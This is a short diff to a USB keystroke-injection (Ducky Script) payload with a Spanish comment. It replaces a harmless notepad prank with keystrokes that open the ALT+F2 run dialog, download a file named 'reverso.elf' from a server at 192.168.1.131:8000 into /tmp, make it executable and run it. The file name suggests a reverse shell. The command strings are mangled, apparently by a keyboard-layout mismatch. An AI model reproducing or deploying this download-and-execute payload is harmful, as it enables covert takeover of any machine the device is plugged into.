@@ -1,8 +1,16 @@
+REM Descargar y ejecutar reverso.elf desde servidor local
+DELAY 2000
+ALT F2
 DELAY 1000
-GUI r
-DELAY 100
-STRING notepad
-DELAY 100
+STRING bash /c @wget http>&&192.168.1.131>8000&reverso.elf /O &tmp&reverso.elf@
 ENTER
-DELAY 250
-STRING You have been hacked!
+DELAY 2000
+ALT F2
+DELAY 1000
+STRING bash /c @chmod SHIFT 0 x &tmp&reverso.elf@
+ENTER
+DELAY 2000
+ALT F2
+DELAY 1000
+STRING bash /c @&tmp&reverso.elf@
+ENTER
